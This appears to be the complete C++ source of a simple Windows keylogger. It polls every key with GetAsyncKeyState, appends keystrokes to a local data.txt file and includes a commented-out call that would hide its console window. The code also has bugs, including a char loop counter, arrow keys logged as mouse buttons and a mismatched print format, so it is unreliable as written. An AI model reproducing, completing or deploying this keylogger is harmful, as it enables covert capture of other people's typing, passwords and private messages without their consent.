#include <iostream>
#include <Windows.h>
#include <ctime>


using namespace std;



//int Save(int _key, char *file);

int Save(int _key, char *file){ 
    FILE *OUTPUT_FILE;

    OUTPUT_FILE = fopen(file, "a+");

    if(_key == VK_ESCAPE){
        exit(0);
    }
    else if(_key == VK_LEFT){
        fprintf(OUTPUT_FILE, "%s", &"MOUSE_LEFT");
    }
    else if(_key == VK_RIGHT){
        fprintf(OUTPUT_FILE, "%s", &"MOUSE_RIGHT");
    }

    fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);

    return 0;
}



int main(){
    //FreeConsole();

    char i;

    while(true){
        for(i = 8; i <= 255; i++){
            if(GetAsyncKeyState(i) == -32767){
                Save(i, "data.txt");
            }
        }
    }
}
